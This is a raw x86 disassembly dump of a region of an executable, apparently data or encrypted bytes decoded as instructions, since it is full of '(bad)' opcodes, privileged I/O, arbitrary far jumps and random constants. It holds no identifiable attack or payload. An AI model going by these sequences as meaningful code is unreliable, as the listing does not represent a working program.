  40aa95:	fst    DWORD PTR [edx-0x19]
  40aa98:	in     al,dx
  40aa99:	push   0xffffffd5
  40aa9b:	(bad)  
  40aa9c:	stc    
  40aa9d:	mov    bh,0xad
  40aa9f:	inc    esi
  40aaa0:	mov    eax,0xf5e9679d
  40aaa5:	int    0x2e
  40aaa7:	fild   QWORD PTR [ebp+0x3f]
  40aaaa:	push   esi
  40aaab:	inc    ebp
  40aaac:	adc    BYTE PTR [edi],ch
  40aaae:	jne    0x40aa3f
  40aab0:	rol    edi,cl
  40aab2:	xlat   BYTE PTR ds:[ebx]
  40aab3:	pop    ds
  40aab4:	xchg   BYTE PTR [edi+0x634cd0a9],cl
  40aaba:	xchg   BYTE PTR [esp+edx*8-0x12],ch
  40aabe:	mov    BYTE PTR [ecx+0x19d97401],0x3a
  40aac5:	in     al,0xc5
  40aac7:	outs   dx,BYTE PTR ds:[esi]
  40aac8:	jb     0x40aaed
  40aaca:	push   ss
  40aacb:	dec    esi
  40aacc:	push   ebx
  40aacd:	ins    BYTE PTR es:[edi],dx
  40aace:	stc    
  40aacf:	sub    DWORD PTR [edi+ecx*4-0x6c5e6a8a],eax
  40aad6:	js     0x40aaf0
  40aad8:	aam    0x94
  40aada:	into   
  40aadb:	and    DWORD PTR [ebx+0x5300a44e],esp
  40aae1:	retf   
  40aae2:	cmp    BYTE PTR [edi],cl
  40aae4:	mov    bl,0xfe
  40aae6:	push   ds
  40aae7:	pop    edx
  40aae8:	aaa    
  40aae9:	push   0x40
  40aaeb:	sbb    DWORD PTR [esi+0x70],edx
  40aaee:	je     0x40aaaa
  40aaf0:	fnsave ds:0xcfa59149
  40aaf6:	das    
  40aaf7:	jns    0x40ab2c
  40aaf9:	dec    eax
  40aafa:	pop    ecx
  40aafb:	(bad)  
  40aafc:	mov    esi,0x40cb0501
  40ab01:	ins    DWORD PTR es:[edi],dx
  40ab02:	std    
  40ab03:	lock cmp edx,ebp
  40ab06:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ab07:	xor    BYTE PTR [ecx+0x15747ca9],ch
  40ab0d:	xor    eax,0x7dc21938
  40ab12:	mov    dl,0xda
  40ab14:	mov    esi,gs
  40ab16:	inc    esi
  40ab17:	sbb    al,dl
  40ab19:	mov    edx,0xdeb91c39
  40ab1e:	xlat   BYTE PTR ds:[ebx]
  40ab1f:	push   ds
  40ab20:	push   edx
  40ab21:	js     0x40ab84
  40ab23:	mov    al,0xf
  40ab25:	rcl    BYTE PTR ds:0x19bfc2b2,0xf4
  40ab2c:	addr16 ja 0x40aaf3
  40ab2f:	xor    al,0x8b
  40ab31:	imul   ecx,DWORD PTR [edx-0x2bbb2f66],0x35a85390
  40ab3b:	and    eax,0x91b13007
  40ab40:	adc    al,0x6b
  40ab42:	inc    ecx
  40ab43:	add    eax,0x19574540
  40ab48:	cmp    eax,0xb0736656
  40ab4d:	mov    ds:0x743f3daa,al
  40ab52:	aam    0x19
  40ab54:	push   ss
  40ab55:	js     0x40aaf1
  40ab57:	xchg   edi,eax
  40ab58:	mov    edx,0x539deee1
  40ab5d:	ss xchg ebp,eax
  40ab5f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ab60:	sbb    al,0xb5
  40ab62:	dec    ebp
  40ab63:	iret   
  40ab64:	add    eax,0xd498a006
  40ab69:	test   eax,0x2e0072a6
  40ab6e:	dec    esi
  40ab6f:	mov    eax,ds:0xebd36efa
  40ab74:	push   esp
  40ab75:	sbb    esi,esi
  40ab77:	fimul  DWORD PTR [ecx]
  40ab79:	jmp    0x40ab64
  40ab7b:	loope  0x40ab9f
  40ab7d:	scas   al,BYTE PTR es:[edi]
  40ab7e:	sbb    eax,0xd711a1ad
  40ab83:	not    DWORD PTR [ebx+0x1fc453be]
  40ab89:	icebp  
  40ab8a:	mov    fs,WORD PTR [esi]
  40ab8c:	mov    esi,0x7c566614
  40ab91:	(bad)  [edi]
  40ab93:	dec    ch
  40ab95:	or     DWORD PTR [ebp+ecx*1+0x1dbd6b19],edx
  40ab9c:	test   DWORD PTR [edx+0x13619b67],edx
  40aba2:	lea    ecx,[bp-0x3a]
  40aba6:	jge    0x40abed
  40aba8:	imul   edx,DWORD PTR [ecx+0x5a],0xd7699717
  40abaf:	push   edx
  40abb0:	js     0x40abcb
  40abb2:	cdq    
  40abb3:	lahf   
  40abb4:	fist   WORD PTR [ecx]
  40abb6:	xor    di,WORD PTR [ecx]
  40abb9:	sbb    eax,edi
  40abbb:	add    DWORD PTR [eax-0x32],0xc5be184a
  40abc2:	push   0x9312b6e1
  40abc7:	mov    ch,0x53
  40abc9:	in     eax,0x43
  40abcb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40abcc:	pop    ss
  40abcd:	mov    ds:0x1f816748,eax
  40abd2:	pop    eax
  40abd3:	mov    al,ds:0xb9a7e923
  40abd8:	shr    ecx,1
  40abda:	add    DWORD PTR [ebx],ecx
  40abdc:	iret   
  40abdd:	sub    BYTE PTR [ebx],ch
  40abdf:	push   cs
  40abe0:	mov    ecx,0x3cbb3701
  40abe5:	push   esp
  40abe6:	or     eax,0x9a07191b
  40abeb:	mov    dh,0x91
  40abed:	imul   edx,ecx,0xc5858dc2
  40abf3:	jg     0x40ac42
  40abf5:	mov    ebp,0x75df2579
  40abfa:	mov    dl,0x7a
  40abfc:	cmp    eax,0xf30f8ccf
  40ac01:	push   0xfffffff4
  40ac03:	or     ax,0x9258
  40ac07:	(bad)  
  40ac08:	(bad)  
  40ac09:	cmp    DWORD PTR [esi-0x18],ebp
  40ac0c:	push   ebx
  40ac0d:	inc    ecx
  40ac0e:	adc    al,0x28
  40ac10:	mov    esi,0xe410f4b
  40ac15:	imul   edx,DWORD PTR [eax-0x59c0825],0x7c
  40ac1c:	pop    es
  40ac1d:	fsub   DWORD PTR [esi-0x6]
  40ac20:	push   ebp
  40ac21:	repnz mov ecx,DWORD PTR [edx-0x2696e3a2]
  40ac28:	aaa    
  40ac29:	fild   QWORD PTR [ecx+0x25]
  40ac2c:	std    
  40ac2d:	jae    0x40abe8
  40ac2f:	inc    eax
  40ac30:	retf   0x6565
  40ac33:	rcr    DWORD PTR [eax],0x5f
  40ac36:	cmp    ah,BYTE PTR [ebp+0x47]
  40ac39:	shl    BYTE PTR [esi+0x1c],0xc3
  40ac3d:	inc    ebp
  40ac3e:	or     eax,0x546f5847
  40ac43:	das    
  40ac44:	xchg   cl,ah
  40ac46:	gs fwait
  40ac48:	popf   
  40ac49:	or     bl,BYTE PTR [ebx+0x1f7a2207]
  40ac4f:	sbb    ecx,eax
  40ac51:	add    DWORD PTR [ecx+0x1a],esp
  40ac54:	xor    BYTE PTR [ecx],0x34
  40ac57:	(bad)  
  40ac58:	push   ebx
  40ac59:	les    eax,FWORD PTR [edi+0x3bbe4d48]
  40ac5f:	cmp    eax,0xba306f1b
  40ac64:	push   0xffffffa4
  40ac66:	jmp    0x681dfd48
  40ac6b:	inc    edi
  40ac6c:	mov    ss,WORD PTR [esi]
  40ac6e:	inc    esi
  40ac6f:	dec    esi
  40ac70:	outs   dx,BYTE PTR ds:[esi]
  40ac71:	jmp    0xe65a:0x147b3d66
  40ac78:	and    al,0x4e
  40ac7a:	pop    ss
  40ac7b:	sbb    edx,DWORD PTR [ebx-0x32bfdc3e]
  40ac81:	out    dx,al
  40ac82:	ins    DWORD PTR es:[edi],dx
  40ac83:	hlt    
  40ac84:	push   ebx
  40ac85:	push   ecx
  40ac86:	enter  0xe136,0x20
  40ac8a:	cmp    esp,DWORD PTR [ebp+esi*2+0x20110718]
  40ac91:	mov    edx,0x9194192d
  40ac96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40ac97:	das    
  40ac98:	xchg   edx,eax
  40ac99:	inc    ebp
  40ac9a:	sub    edi,edx
  40ac9c:	shr    BYTE PTR [esp+ecx*2],1
  40ac9f:	cwde   
  40aca0:	push   esp
  40aca1:	std    
  40aca2:	mov    al,0xfb
  40aca4:	add    dh,bh
  40aca6:	dec    eax
  40aca7:	(bad)  
  40aca8:	fdiv   QWORD PTR [ecx-0x39]
  40acab:	or     bh,BYTE PTR [eax+0x155bc927]
  40acb1:	std    
  40acb2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40acb3:	jbe    0x40ac94
  40acb5:	hlt    
  40acb6:	iret   
  40acb7:	aas    
  40acb8:	push   ebx
  40acb9:	fnstenv [ebx+0x419bbfa5]
  40acbf:	xchg   edi,eax
  40acc0:	scas   al,BYTE PTR es:[edi]
  40acc1:	imul   ecx,DWORD PTR [ebx+0x1d12ff73],0x49cfc199
  40accb:	pop    eax
  40accc:	sbb    esi,DWORD PTR [ecx-0x7a]
  40accf:	mov    ecx,0x12bc3ea7
  40acd4:	imul   edx,DWORD PTR es:[ebp+0x5585bfbf],0x53
  40acdc:	pop    edi
  40acdd:	and    ah,BYTE PTR [edi-0x40]
  40ace0:	je     0x40ac76
  40ace2:	mov    cl,0x59
  40ace4:	cmc    
  40ace5:	lahf   
  40ace6:	outs   dx,BYTE PTR ds:[esi]
  40ace7:	mov    esi,esp
  40ace9:	sbb    BYTE PTR [ebp+0x65e57ec9],bl
  40acef:	(bad)
  40acf3:	sbb    cl,BYTE PTR [ebx-0x28]
  40acf6:	data16 out dx,al
  40acf8:	adc    esi,DWORD PTR [esi-0x7]
  40acfb:	mov    ds:0x816fc3d5,al
  40ad00:	shr    BYTE PTR [edx+0x1],0xe3
  40ad04:	shl    BYTE PTR [ecx+0x7],cl
  40ad07:	out    dx,eax
  40ad08:	in     al,0x3c
  40ad0a:	dec    eax
  40ad0b:	xor    al,0xaf
  40ad0d:	clc    
  40ad0e:	call   0x688d40ab
  40ad13:	stos   BYTE PTR es:[edi],al
  40ad14:	mov    al,ds:0x2cbda311
  40ad19:	mov    al,ds:0x697bfc46
  40ad1e:	jmp    0xc013:0x6203b4ed
  40ad25:	cs mov bp,0x8cc
  40ad2a:	cmc    
  40ad2b:	fcmovne st,st(5)
  40ad2d:	das    
  40ad2e:	add    BYTE PTR [ecx],bh
  40ad30:	fisubr DWORD PTR [esi]
  40ad32:	add    DWORD PTR [ebx+0x2f5c614c],ecx
  40ad38:	enter  0x11ca,0x71
  40ad3c:	es test eax,0x24ddf479
  40ad42:	das    
  40ad43:	pusha  
  40ad44:	fld    TBYTE PTR [edx+0x489f909]
  40ad4a:	fistp  QWORD PTR ds:0x82610f98
  40ad50:	rcr    BYTE PTR [ebp+0x2988f547],1
  40ad56:	jecxz  0x40ad9c
  40ad58:	aam    0xa8
  40ad5a:	jns    0x40ad5a
  40ad5c:	lods   al,BYTE PTR ds:[esi]
  40ad5d:	outs   dx,BYTE PTR ds:[esi]
  40ad5e:	jo     0x40adad
  40ad60:	inc    ebx
  40ad61:	sti    
  40ad62:	pop    es
  40ad63:	xchg   BYTE PTR [esi+0x6a],dh
  40ad66:	jg     0x40ad09
  40ad68:	sbb    bh,bh
  40ad6a:	or     eax,0x46591423
  40ad6f:	das    
  40ad70:	dec    BYTE PTR [ecx+0x48]
  40ad73:	jae    0x40ad42
  40ad75:	cmp    eax,0xb27e585d
  40ad7a:	pushf  
  40ad7b:	aad    0x85
  40ad7d:	imul   esi,DWORD PTR [ecx+0x41a19c4a],0x6685b9eb
  40ad87:	cwde   
  40ad88:	loopne 0x40adbf
  40ad8a:	retf   
  40ad8b:	jmp    0x35516a8c
  40ad90:	adc    eax,0xdfbf2219
  40ad95:	mov    ebx,0xbfb0ab59
  40ad9a:	xchg   ebx,eax
  40ad9b:	inc    esi
  40ad9c:	das    
  40ad9d:	ins    BYTE PTR es:[edi],dx
  40ad9e:	inc    esp
  40ad9f:	or     al,0xc6
  40ada1:	repz js 0x40ae0d
  40ada4:	push   ebx
  40ada5:	shl    DWORD PTR [esi],0x7b
  40ada8:	fnstenv [edi+ebp*1-0x2be384b8]
  40adaf:	retf   0x6a5c
  40adb2:	gs retf 0xab12
  40adb6:	and    DWORD PTR [esi-0x3f],0xf7e80ac4
  40adbd:	mov    ds:0xe0cddfb9,eax
  40adc2:	aad    0x15
  40adc4:	fldcw  WORD PTR [edx+0x8]
  40adc7:	fdivr  st,st(3)
  40adc9:	push   ecx
  40adca:	dec    eax
  40adcb:	xor    eax,0x3a791867
  40add0:	(bad)  
  40add2:	sub    al,dh
  40add4:	or     al,0xfa
  40add6:	bndstx [ebx+0x8f4bced],(bad)
  40addd:	aam    0x9d
  40addf:	outs   dx,DWORD PTR ds:[esi]
  40ade0:	push   ebx
  40ade1:	mov    edx,0x5d5a1e29
  40ade6:	adc    BYTE PTR [edi+0x53c06b26],cl
  40adec:	(bad)  
  40aded:	imul   DWORD PTR [esi]
  40adef:	dec    esi
  40adf0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40adf1:	stos   BYTE PTR es:[edi],al
  40adf2:	fs jp  0x40addc
  40adf5:	push   esi
  40adf6:	(bad)  
  40adf7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40adf8:	adc    BYTE PTR [ecx-0xc],0x49
  40adfc:	jmp    0x40adff
  40adfe:	push   edx
  40adff:	xchg   ecx,eax
  40ae00:	sbb    eax,0x69836bcb
  40ae05:	cmp    edi,edx
  40ae07:	scas   eax,DWORD PTR es:[edi]
  40ae08:	and    eax,0xef656683
  40ae0d:	jmp    0x40ae2a
  40ae0f:	xlat   BYTE PTR ds:[ebx]
  40ae10:	xchg   esi,eax
  40ae11:	jbe    0x40ae25
  40ae13:	mov    BYTE PTR [edi+ebp*2+0x7d9119cc],ch
  40ae1a:	mov    DWORD PTR [ecx],eax
  40ae1c:	or     DWORD PTR [edi],0xffffffcb
  40ae1f:	test   al,0x53
  40ae21:	jb     0x40ae6e
  40ae23:	sub    BYTE PTR [edx+0x34],al
  40ae26:	mov    ecx,DWORD PTR [eax-0x634c969b]
  40ae2c:	test   al,0x51
  40ae2e:	es xchg ch,al
  40ae31:	adc    esp,DWORD PTR [esi-0x2f]
  40ae34:	pop    edi
  40ae35:	idiv   DWORD PTR [ebp+0x289b23d6]
  40ae3b:	or     eax,0x408ad37b
  40ae40:	ror    DWORD PTR [edx+0xa],cl
  40ae43:	cmps   DWORD PTR gs:[esi],DWORD PTR es:[edi]
  40ae45:	mov    fs,WORD PTR [eax+ecx*4-0x6d52d5ad]
  40ae4c:	std    
  40ae4d:	jno    0x40ae04
  40ae4f:	out    0xcf,al
  40ae51:	push   0xffffff89
  40ae53:	mov    eax,ds:0x2734e150
  40ae58:	push   edx
  40ae59:	adc    esp,DWORD PTR [ebp+0x15]
  40ae5c:	and    DWORD PTR ss:[ecx-0x23],esi
  40ae60:	pop    ecx
  40ae61:	stos   BYTE PTR es:[edi],al
  40ae62:	cmp    BYTE PTR [edx-0x42884bd9],bh
  40ae68:	push   0xfffffff1
  40ae6a:	sti    
  40ae6b:	cdq    
  40ae6c:	dec    edx
  40ae6d:	and    al,0x42
  40ae6f:	sbb    DWORD PTR [eax],0xffffffe8
  40ae72:	cmp    WORD PTR [eax],sp
  40ae75:	pop    ebx
  40ae76:	dec    esp
  40ae77:	out    dx,al
  40ae78:	adc    al,0x75
  40ae7a:	mov    bl,bh
  40ae7c:	jl     0x40ae1b
  40ae7e:	lods   eax,DWORD PTR ds:[esi]
  40ae7f:	inc    edi
  40ae80:	push   ebx
  40ae81:	mov    edx,0xec8e764c
  40ae86:	loop   0x40ae3f
  40ae88:	outs   dx,DWORD PTR ds:[esi]
  40ae89:	mov    bh,0x4d
  40ae8b:	dec    edi
  40ae8c:	fs ins BYTE PTR es:[edi],dx
  40ae8e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ae8f:	lahf   
  40ae90:	mov    eax,0xb75e33c8
  40ae95:	rcl    DWORD PTR [ebp+0x451c526c],cl
  40ae9b:	and    edx,DWORD PTR [eax]
  40ae9d:	sub    al,0xae
  40ae9f:	fnstcw WORD PTR [eax]
  40aea1:	shl    BYTE PTR [ecx-0x3d],cl
  40aea4:	push   ebx
  40aea5:	sub    DWORD PTR [eax-0x1c],esi
  40aea8:	xchg   esi,eax
  40aea9:	ins    BYTE PTR es:[edi],dx
  40aeaa:	jg     0x40aed8
  40aeac:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aead:	imul   edx,DWORD PTR [ecx],0xd796ce83
  40aeb3:	adc    BYTE PTR [eax-0x1e],dl
  40aeb6:	data16 (bad) 
  40aeb8:	loope  0x40aeb6
  40aeba:	cmp    DWORD PTR [esi-0x52],edi
  40aebd:	push   es
  40aebe:	add    bl,BYTE PTR [ebx]
  40aec0:	popf   
  40aec1:	dec    eax
  40aec2:	(bad)  
  40aec3:	mov    edx,0xfc715041
  40aec8:	push   ebx
  40aec9:	scas   al,BYTE PTR es:[edi]
  40aeca:	mov    eax,ds:0xc2302fbb
  40aecf:	mov    esi,0x56bdec6
  40aed4:	push   ebx
  40aed5:	pop    esp
  40aed6:	mov    edi,0xc4b6baf0
  40aedb:	stos   DWORD PTR es:[edi],eax
  40aedc:	gs adc dl,ah
  40aedf:	pushf  
  40aee0:	push   ebx
  40aee1:	out    0x3d,eax
  40aee3:	mov    ch,0x8a
  40aee5:	test   eax,edx
  40aee7:	sbb    DWORD PTR [ebx+esi*4+0x777b9a90],eax
  40aeee:	bnd jns 0x40af44
  40aef1:	dec    edx
  40aef2:	les    esp,FWORD PTR [edi+0x14d49325]
  40aef8:	cmp    DWORD PTR [edx+0x44],ebp
  40aefb:	sar    BYTE PTR [ebx-0x77e3169d],1
  40af01:	in     al,dx
  40af02:	inc    esi
  40af03:	fcom   QWORD PTR [ebx-0x39]
  40af06:	jl     0x40aec6
  40af08:	lds    eax,FWORD PTR [edi]
  40af0a:	xchg   edx,eax
  40af0b:	mov    ah,bl
  40af0d:	push   0xfffffff0
  40af0f:	ins    BYTE PTR es:[edi],dx
  40af10:	xor    ebx,DWORD PTR [ecx+0x64]
  40af13:	mov    WORD PTR [ebx+0x7271797b],ds
  40af19:	test   eax,0x3bdd22e9
  40af1e:	lds    ecx,FWORD PTR ds:0x6af56afc
  40af24:	mov    ecx,0xfde434f4
  40af29:	pop    eax
  40af2a:	data16 test al,0xaa
  40af2d:	sbb    DWORD PTR [edi],0xd3348b2f
  40af33:	test   al,0x83
  40af35:	sbb    ebp,edi
  40af37:	lds    edx,FWORD PTR [ebx-0x66d35558]
  40af3d:	and    eax,0x1d225767
  40af42:	fcmovb st,st(0)
  40af44:	inc    ebx
  40af45:	arpl   WORD PTR [esi+0x1c],dx
  40af48:	das    
  40af49:	and    al,BYTE PTR [ebp+0x27c8db19]
  40af4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40af50:	or     BYTE PTR [eax+0x14],dh
  40af53:	jne    0x40aed9
  40af55:	adc    cl,BYTE PTR [ebp-0x51a01467]
  40af5b:	mov    db0,ebp
  40af5e:	push   ss
  40af5f:	sbb    ebx,ecx
  40af61:	mov    bl,0x22
  40af63:	xchg   esi,eax
  40af64:	call   0x909c:0x532811b4
  40af6b:	lods   eax,DWORD PTR ds:[esi]
  40af6c:	das    
  40af6d:	xchg   BYTE PTR [esi-0x20],ch
  40af70:	pusha  
  40af71:	imul   ebp,DWORD PTR [edx],0x73030a53
  40af77:	cmp    eax,0x31634dab
  40af7c:	retf   
  40af7d:	call   0xadb1:0x6b2315b0
  40af84:	out    0x9e,eax
  40af86:	push   es
  40af87:	dec    edi
  40af88:	mov    eax,ds:0xe53e70b3
  40af8d:	and    al,ch
  40af8f:	hlt    
  40af90:	xor    edx,DWORD PTR [ecx]
  40af92:	es aad 0xa4
  40af95:	imul   ebp,esp,0x67a27396
  40af9b:	sbb    BYTE PTR [esi-0x11],ah
  40af9e:	outs   dx,WORD PTR ds:[esi]
  40afa0:	stc    
  40afa1:	push   edi
  40afa2:	inc    esi
  40afa3:	pusha  
  40afa4:	std    
  40afa5:	lods   eax,DWORD PTR ds:[esi]
  40afa6:	mov    ds,WORD PTR [ecx]
  40afa8:	and    eax,0xaf6586d6
  40afad:	stc    
  40afae:	es lock push ebx
  40afb1:	or     esp,esp
  40afb3:	dec    ebp
  40afb4:	int    0x97
  40afb6:	dec    esi
  40afb7:	mov    WORD PTR [esi],cs
  40afb9:	add    cl,cl
  40afbb:	sub    BYTE PTR [ecx],ch
  40afbd:	add    DWORD PTR [ebp-0x21],edx
  40afc0:	push   edx
  40afc1:	pop    ebx
  40afc2:	and    edx,0xfffffff7
  40afc5:	mov    dh,0xc5
  40afc7:	jno    0x40b01c
  40afc9:	or     DWORD PTR [edi],esi
  40afcb:	cmp    al,0x9e
  40afcd:	js     0x40affe
  40afcf:	les    edi,FWORD PTR [ecx+0x679dbb6a]
  40afd5:	daa    
  40afd6:	retf   
  40afd7:	shr    DWORD PTR [edi+0x53d06cca],cl
  40afdd:	inc    BYTE PTR [ebp+0x49]
  40afe0:	jecxz  0x40afeb
  40afe2:	out    dx,al
  40afe3:	push   edi
  40afe4:	fild   QWORD PTR [edx+0x19]
  40afe7:	pusha  
  40afe8:	(bad)  
  40afe9:	mov    esi,0x5541fa87
  40afee:	cmp    WORD PTR gs:[ebx],sp
  40aff2:	call   0xe4838e1e
  40aff7:	sbb    ebx,ebp
  40aff9:	xor    eax,0x3c8c81ef
  40affe:	adc    DWORD PTR [edx+edx*2],edx
  40b001:	jg     0x40afee
  40b003:	xchg   esp,eax
  40b004:	and    eax,0x1bd5396a
  40b009:	adc    bx,WORD PTR [ebx]
  40b00c:	cs sti 
  40b00e:	push   eax
  40b00f:	mov    dh,0x58
  40b011:	js     0x40afae
  40b013:	mov    cl,0x58
  40b015:	adc    DWORD PTR [eax+0x3ae9a8b0],0x1c
  40b01c:	(bad)  
  40b01d:	fild   QWORD PTR [edi-0x46]
  40b020:	adc    ecx,edx
  40b022:	pop    ss
  40b023:	(bad)  [ecx]
  40b025:	retf   0xda9
  40b028:	push   ecx
  40b029:	and    al,0x66
  40b02b:	sbb    eax,0x46b6b1ea
  40b030:	test   ebx,edx
  40b032:	push   0xf2760e1b
  40b037:	pop    edx
  40b038:	icebp  
  40b039:	fwait
  40b03a:	cmp    al,0xab
  40b03c:	push   ebx
  40b03d:	jno    0x40b098
  40b03f:	repz jae 0x40b01f
  40b042:	repnz cli 
  40b044:	ret    0x21ed
  40b047:	xlat   BYTE PTR ds:[ebx]
  40b048:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b049:	or     BYTE PTR [ebx+edx*8],bl
  40b04c:	xchg   esp,eax
  40b04d:	stos   BYTE PTR es:[edi],al
  40b04e:	arpl   WORD PTR [edx+0x257de985],di
  40b054:	cmp    eax,0x7be3ef5d
  40b059:	imul   esp,edi,0xc5083861
  40b05f:	cmp    edx,DWORD PTR gs:[ebp+0x9f01066]
  40b066:	jns    0x40b01e
  40b068:	sahf   
  40b069:	add    al,0xbf
  40b06b:	or     DWORD PTR [esi+0x74],edx
  40b06e:	push   cs
  40b06f:	inc    esi
  40b070:	imul   esp,DWORD PTR cs:[ebx-0x20488191],0x38
  40b078:	push   edx
  40b079:	xchg   edi,eax
  40b07a:	xchg   esi,eax
  40b07b:	jbe    0x40b063
  40b07d:	xchg   edx,eax
  40b07e:	and    edx,edi
  40b080:	adc    ebx,DWORD PTR [edx+eiz*4+0x19]
  40b084:	xchg   esp,eax
  40b085:	dec    bl
  40b087:	push   edi
  40b088:	lea    ebx,[eax-0x32983e6e]
  40b08e:	sub    cl,dh
  40b090:	aam    0xae
  40b092:	pusha  
  40b093:	mov    eax,0xf1dd7108
  40b098:	push   esp
  40b099:	imul   ebx,DWORD PTR [esp+edx*1-0x5e],0xcb93b686
  40b0a1:	mul    al
  40b0a3:	ror    edx,1
  40b0a5:	sti    
  40b0a6:	retw   0x5617
  40b0aa:	test   DWORD PTR [ebp*1-0x56e6ccab],0x4048c1d4
  40b0b5:	pop    es
  40b0b6:	mov    DWORD PTR [edi-0x41],ebx
  40b0b9:	shl    DWORD PTR [esi-0x1b],1
  40b0bc:	imul   edx,DWORD PTR [eax+0x3fc3da2e],0x4d
  40b0c3:	mov    edx,0xd9b68c17
  40b0c8:	lea    ebx,[eax+eiz*4-0x74]
  40b0cc:	mov    bh,0x71
  40b0ce:	jns    0x40b079
  40b0d0:	hlt    
  40b0d1:	sar    DWORD PTR [esi],cl
  40b0d3:	fninit 
  40b0d5:	inc    ebx
  40b0d6:	cs sbb ebx,edi
  40b0d9:	add    al,0x32
  40b0db:	fist   WORD PTR [ebx+0x53c2c70c]
  40b0e1:	sub    BYTE PTR [ebp-0x44],cl
  40b0e4:	jl     0x40b0c8
  40b0e6:	jnp    0x40b155
  40b0e8:	imul   esp,DWORD PTR [edi-0x52],0x97059179
  40b0ef:	hlt    
  40b0f0:	jb     0x40b0db
  40b0f2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b0f3:	out    0x96,al
  40b0f5:	mov    BYTE PTR [ecx+0x41],bh
  40b0f8:	rcl    ch,1
  40b0fa:	enter  0xb5c8,0x9a
  40b0fe:	ret    
  40b0ff:	sbb    DWORD PTR [eax+0x23],ebx
  40b102:	imul   edi,DWORD PTR [ecx],0xfffffffd
  40b105:	sub    edi,edi
  40b107:	bound  edx,QWORD PTR [edx-0x5b]
  40b10a:	or     DWORD PTR [esi],eax
  40b10c:	retf   
  40b10d:	test   al,0x8f
  40b10f:	imul   ebx,DWORD PTR [ebx],0x31
  40b112:	js     0x40b12c
  40b114:	sbb    al,0x42
  40b116:	adc    al,0xa2
  40b118:	jmp    0x40b0da
  40b11a:	xchg   ebp,eax
  40b11b:	adc    dl,BYTE PTR [ebx-0x40]
  40b11e:	sub    al,BYTE PTR [edi-0x66]
  40b121:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b122:	mov    eax,ds:0xc5e9f717
  40b127:	sbb    DWORD PTR [edi-0x52a4dc4],ebp
  40b12d:	fmul   DWORD PTR [ebp+0x3e]
  40b130:	dec    esp
  40b131:	leave  
  40b132:	pop    edx
  40b133:	lds    ebp,FWORD PTR [eax+0x70c8e6a8]
  40b139:	push   ds
  40b13a:	push   ecx
  40b13b:	sub    DWORD PTR [esi],ebp
  40b13d:	imul   eax,DWORD PTR [ecx+0x40],0x26
  40b141:	push   ecx
  40b142:	sub    edi,DWORD PTR [esi]
  40b144:	ja     0x40b196
  40b146:	inc    sp
  40b148:	out    0x99,eax
  40b14a:	into   
  40b14b:	lahf   
  40b14c:	adc    DWORD PTR [ecx],eax
  40b14e:	cmp    ebx,DWORD PTR [ecx]
  40b150:	mov    al,ds:0x35466a12
  40b155:	jae    0x40b100
  40b157:	mov    ch,0x50
  40b159:	rol    DWORD PTR [edx-0x37],cl
  40b15c:	push   ds
  40b15d:	mov    bh,0xf1
  40b15f:	sbb    edi,edx
  40b161:	pop    ds
  40b162:	mov    ebp,0xabda31b9
  40b167:	fs push ebx
  40b169:	sahf   
  40b16a:	popf   
  40b16b:	xchg   edx,eax
  40b16c:	fnstenv [ecx+0x5e5b7b1]
  40b172:	jbe    0x40b115
  40b174:	push   edi
  40b175:	mov    eax,ds:0x9b4baf39
  40b17a:	cmp    dl,bh
  40b17c:	push   eax
  40b17d:	lods   al,BYTE PTR ds:[esi]
  40b17e:	cmp    dh,BYTE PTR [ecx-0x4a]
  40b181:	push   eax
  40b182:	adc    DWORD PTR cs:[ecx-0x42cc697a],esi
  40b189:	add    eax,0x36780b41
  40b18e:	pop    esi
  40b18f:	dec    esi
  40b190:	sbb    ecx,DWORD PTR [edx]
  40b192:	push   0xb3e264fb
  40b197:	not    ebx
  40b199:	cmp    edi,edx
  40b19b:	fsub   QWORD PTR [ebx+edi*1]
  40b19e:	push   ds
  40b19f:	mov    edx,0x59dae659
  40b1a4:	shl    BYTE PTR [edi+0x51],0x12
  40b1a8:	icebp  
  40b1a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40b1aa:	jns    0x40b1eb
  40b1ac:	jmp    0xde5e:0xd4d04ff1
  40b1b3:	sbb    esp,eax
  40b1b5:	lock jg 0x40b17e
  40b1b8:	dec    esi
  40b1b9:	add    al,0x54
  40b1bb:	jp     0x40b210
  40b1bd:	pop    edx
  40b1be:	or     ebp,edx
  40b1c0:	jge    0x40b180
  40b1c2:	mov    al,ds:0x456b187a
  40b1c7:	imul   ch
  40b1c9:	or     DWORD PTR [esi+0x66b241a3],ecx
  40b1cf:	or     BYTE PTR [edx+0x3b26f95e],dl
  40b1d5:	cwde   
  40b1d6:	inc    edx
  40b1d7:	retf   0x6aea
  40b1da:	xor    DWORD PTR [edx+0x5d52ecb6],ebp
  40b1e0:	(bad)  
  40b1e1:	jp     0x40b25c
  40b1e3:	cmp    al,0x96
  40b1e5:	leave  
  40b1e6:	sbb    ch,BYTE PTR [esi-0x58]
  40b1e9:	loop   0x40b17a
  40b1eb:	sbb    ebx,ebp
  40b1ed:	mov    bh,0x62
  40b1ef:	daa    
  40b1f0:	xor    al,0xba
  40b1f2:	outs   dx,DWORD PTR ds:[esi]
  40b1f3:	fs push ebx
  40b1f5:	fstp   TBYTE PTR [ecx]
  40b1f7:	test   ebx,ecx
  40b1f9:	mov    esi,0x48cbdc6
  40b1fe:	sub    dh,BYTE PTR [ecx-0x23ce873b]
  40b204:	inc    ebx
  40b205:	data16 jge 0x40b287
  40b208:	push   ebx
  40b209:	loopne 0x40b1f7
  40b20b:	mov    ch,0x4a
  40b20d:	(bad)  
  40b20e:	out    dx,al
  40b20f:	jb     0x40b1ba
  40b211:	imul   ecx,DWORD PTR [edi+ebp*1+0x7f],0x74e9fb3b
  40b219:	mov    esi,0x7c933579
  40b21e:	call   0x1359:0xca39f091
  40b225:	(bad)  
  40b227:	or     dl,0x8a
